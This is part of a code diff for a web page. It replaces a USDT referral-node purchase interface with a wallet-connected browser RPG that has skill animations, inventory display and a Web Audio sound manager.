+        updateCharacter();
+        await updateBalances();
+
+        showToast(`击败 ${boss.name}！获得 ${boss.reward}`, 'success');
+      } catch (e) {
+        showToast('挑战失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    function showSkillEffect() {
+      const gameSection = document.querySelector('.game-section');
+      if (!gameSection) return;
+
+      const charClass = character.class || 'warrior';
+      const effectContainer = document.createElement('div');
+      effectContainer.style.position = 'relative';
+      effectContainer.style.width = '100%';
+      effectContainer.style.height = '200px';
+      effectContainer.style.display = 'flex';
+      effectContainer.style.justifyContent = 'center';
+      effectContainer.style.alignItems = 'center';
+      
+      gameSection.appendChild(effectContainer);
+
+      if (charClass === 'warrior') {
+        const slash1 = document.createElement('div');
+        slash1.className = 'slash-effect';
+        slash1.style.left = '50%';
+        slash1.style.top = '50%';
+        slash1.style.transformOrigin = 'left center';
+        effectContainer.appendChild(slash1);
+
+        setTimeout(() => {
+          const slash2 = document.createElement('div');
+          slash2.className = 'slash-effect';
+          slash2.style.left = '50%';
+          slash2.style.top = '50%';
+          slash2.style.transformOrigin = 'left center';
+          slash2.style.transform = 'rotate(-45deg)';
+          effectContainer.appendChild(slash2);
+        }, 150);
+      } else if (charClass === 'mage') {
+        const circle = document.createElement('div');
+        circle.className = 'magic-circle';
+        circle.style.left = '50%';
+        circle.style.top = '50%';
+        circle.style.transform = 'translate(-50%, -50%)';
+        effectContainer.appendChild(circle);
+
+        setTimeout(() => {
+          const beam = document.createElement('div');
+          beam.style.position = 'absolute';
+          beam.style.width = '4px';
+          beam.style.height = '100px';
+          beam.style.background = 'linear-gradient(0deg, #9333ea, #a855f7, transparent)';
+          beam.style.left = '50%';
+          beam.style.top = '20%';
+          beam.style.transform = 'translateX(-50%)';
+          beam.style.boxShadow = '0 0 20px #9333ea';
+          beam.style.animation = 'slash 0.3s ease-out forwards';
+          effectContainer.appendChild(beam);
+        }, 300);
+      } else if (charClass === 'archer') {
+        const arrow = document.createElement('div');
+        arrow.className = 'arrow-projectile';
+        arrow.textContent = '🏹';
+        arrow.style.left = '20%';
+        arrow.style.top = '50%';
+        arrow.style.transform = 'translateY(-50%)';
+        effectContainer.appendChild(arrow);
+      }
+
+      document.body.classList.add('shake');
+      setTimeout(() => document.body.classList.remove('shake'), 200);
+
+      setTimeout(() => {
+        effectContainer.remove();
+      }, 1000);
+    }
+
+    // 更新角色信息
+    function updateCharacter() {
+      document.getElementById('charLevel').textContent = character.level;
+      document.getElementById('statAtk').textContent = character.atk;
+      document.getElementById('statDef').textContent = character.def;
+      document.getElementById('statHp').textContent = character.hp;
+      document.getElementById('statExp').textContent = character.exp;
+    }
+
+    // 更新装备栏
+    function updateInventory() {
+      const grid = document.getElementById('inventoryGrid');
+      let html = '';
+      
+      inventory.forEach(item => {
+        html += `<div class="inventory-slot">${item.icon}</div>`;
+      });
+      
+      for (let i = inventory.length; i < 18; i++) {
+        html += `<div class="inventory-slot empty"></div>`;
+      }
+      
+      grid.innerHTML = html;
+    }
+
+    // 显示提示
+    function showToast(message, type = '') {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = 'toast show ' + type;
+      
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    // 显示加载
+    function showLoading(show) {
+      document.getElementById('loading').style.display = show ? 'flex' : 'none';
+    }
+
+    // 监听账户变化
+    if (window.ethereum) {
+      window.ethereum.on('accountsChanged', accounts => {
+        if (accounts.length === 0) {
+          document.getElementById('walletAddress').textContent = '未连接';
+          document.getElementById('connectBtn').textContent = '连接钱包';
+          document.getElementById('connectBtn').disabled = false;
+          document.getElementById('rechargeBtn').disabled = true;
+          document.getElementById('partnerBtn').disabled = true;
         } else {
-          alert(t('error') + ': ' + e.message);
+          connectWallet();
         }
-      }
+      });
     }
-    
-    function disconnectWallet() {
-      currentAccount = null;
-      document.getElementById('myNodes').textContent = '0';
-      document.getElementById('directTeam').textContent = '0';
-      document.getElementById('totalTeam').textContent = '0';
-      document.getElementById('referralLink').textContent = '';
-      document.getElementById('referrerAddress').textContent = '-';
-    }
-    
-    function updateReferralLink() {
-      myReferralLink = generateReferralLink();
-      document.getElementById('referralLink').textContent = myReferralLink || '-';
-    }
-    
-    async function updateStats() {
-      if (!currentAccount) return;
-      
-      try {
-        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, CONFIG.USDT_ABI, web3);
-        const balance = await usdtContract.balanceOf(currentAccount);
-        const readableBalance = ethers.utils.formatUnits(balance, 18);
-      } catch (e) {
-      }
-      
-      try {
-        const referralContract = new ethers.Contract(CONFIG.REFERRAL_CONTRACT, CONFIG.REFERRAL_ABI, web3);
-        const stats = await referralContract.getUserStats(currentAccount);
-        
-        const nodeCount = stats[0].toString();
-        const directAmount = ethers.utils.formatUnits(stats[1], 18);
-        const totalAmount = ethers.utils.formatUnits(stats[2], 18);
-        const referrer = stats[3];
-        
-        document.getElementById('myNodes').textContent = nodeCount + ' 个';
-        document.getElementById('directTeam').textContent = parseFloat(directAmount).toFixed(4) + ' USDT';
-        document.getElementById('totalTeam').textContent = parseFloat(totalAmount).toFixed(4) + ' USDT';
-        document.getElementById('referrerAddress').textContent = referrer !== '0x0000000000000000000000000000000000000000' ? referrer : '-';
-      } catch (e) {
-        console.log('获取统计数据失败:', e);
-      }
-    }
-    
-    async function buyNode(type = 'gold') {
-      if (!currentAccount) {
-        alert(t('pleaseConnect'));
-        if (typeof window.ethereum === 'undefined') {
-          alert(t('pleaseInstall'));
-          return;
-        }
+
+    const SoundManager = {
+      audioContext: null,
+      muted: false,
+      bgmPlayer: null,
+      init: function() {
         try {
-          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-          web3 = new ethers.providers.Web3Provider(window.ethereum);
-          signer = web3.getSigner();
-          currentAccount = accounts[0];
+          this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
         } catch (e) {
-          alert(t('error') + ': ' + e.message);
-          return;
+          console.log('Web Audio API not supported');
         }
+        this.bgmPlayer = document.getElementById('bgmPlayer');
+        this.muted = localStorage.getItem('koala_legend_muted') === 'true';
+        this.updateMuteButton();
+        if (this.bgmPlayer) {
+          this.bgmPlayer.volume = 0.3;
+        }
+      },
+      toggleMute: function() {
+        this.muted = !this.muted;
+        localStorage.setItem('koala_legend_muted', this.muted);
+        this.updateMuteButton();
+        if (this.bgmPlayer) {
+          this.bgmPlayer.muted = this.muted;
+        }
+      },
+      updateMuteButton: function() {
+        const btn = document.getElementById('soundBtn');
+        if (btn) {
+          btn.innerHTML = this.muted ? '🔇' : '🎵';
+          btn.title = this.muted ? '开启音效' : '关闭音效';
+        }
+      },
+      playBGM: function() {
+        if (!this.muted && this.bgmPlayer) {
+          this.bgmPlayer.play().catch(e => {
+            console.log('BGM play failed:', e);
+          });
+        }
+      },
+      pauseBGM: function() {
+        if (this.bgmPlayer) {
+          this.bgmPlayer.pause();
+        }
+      },
+      playTone: function(frequency, duration, type = 'square', volume = 0.1) {
+        if (this.muted || !this.audioContext) return;
+        const oscillator = this.audioContext.createOscillator();
+        const gainNode = this.audioContext.createGain();
+        oscillator.connect(gainNode);
+        gainNode.connect(this.audioContext.destination);
+        oscillator.type = type;
+        oscillator.frequency.setValueAtTime(frequency, this.audioContext.currentTime);
+        gainNode.gain.setValueAtTime(volume, this.audioContext.currentTime);
+        gainNode.gain.exponentialRampToValueAtTime(0.001, this.audioContext.currentTime + duration);
+        oscillator.start(this.audioContext.currentTime);
+        oscillator.stop(this.audioContext.currentTime + duration);
+      },
+      playAttack: function() {
+        this.playTone(880, 0.15, 'sawtooth', 0.15);
+        setTimeout(() => this.playTone(1320, 0.1, 'square', 0.1), 50);
+      },
+      playHit: function() {
+        this.playTone(150, 0.3, 'sawtooth', 0.2);
+        setTimeout(() => this.playTone(100, 0.2, 'square', 0.15), 100);
+      },
+      playVictory: function() {
+        const notes = [523, 659, 784, 1047];
+        notes.forEach((freq, i) => {
+          setTimeout(() => this.playTone(freq, 0.3, 'sine', 0.15), i * 150);
+        });
+      },
+      playButton: function() {
+        this.playTone(600, 0.05, 'sine', 0.08);
       }
-      
-      const nodeType = CONFIG.NODE_TYPES[type] || CONFIG.NODE_TYPES.gold;
-      
-      try {
-        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, CONFIG.USDT_ABI, signer);
-        const referralContract = new ethers.Contract(CONFIG.REFERRAL_CONTRACT, CONFIG.REFERRAL_ABI, signer);
-        const amount = ethers.utils.parseUnits(nodeType.price.toString(), 18);
-        
-        const balance = await usdtContract.balanceOf(currentAccount);
-        if (balance.lt(amount)) {
-          alert(t('insufficientBalance') + nodeType.price + ' USDT');
-          return;
-        }
-        
-        const allowance = await usdtContract.allowance(currentAccount, CONFIG.REFERRAL_CONTRACT);
-        if (allowance.lt(amount)) {
-          const approveTx = await usdtContract.approve(CONFIG.REFERRAL_CONTRACT, amount);
-          await approveTx.wait();
-        }
-        
-        const purchaseTx = await referralContract.purchaseNode(amount);
-        await purchaseTx.wait();
-        
-        alert(t('transferSuccess') + ' ' + nodeType.price + ' USDT');
-        
-        await updateStats();
-        
-      } catch (e) {
-        if (e.code === 4001) {
-          alert(t('cancel'));
-        } else {
-          alert(t('error') + ': ' + e.message);
-        }
-      }
-    }
+    };
+
+    SoundManager.init();
     
-    window.addEventListener('load', async () => {
-      parseReferrer();
-      if (typeof window.ethereum !== 'undefined') {
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts.length > 0) {
-          currentAccount = accounts[0];
-          web3 = new ethers.providers.Web3Provider(window.ethereum);
-          signer = web3.getSigner();
-          updateStats();
-          updateReferralLink();
-        }
-      }
-    });
   </script>
+  
+  <audio id="bgmPlayer" loop>
+    <source src="https://music.163.com/song/media/outer/url?id=186297.mp3" type="audio/mpeg">
+  </audio>
+  
 </body>
 </html>
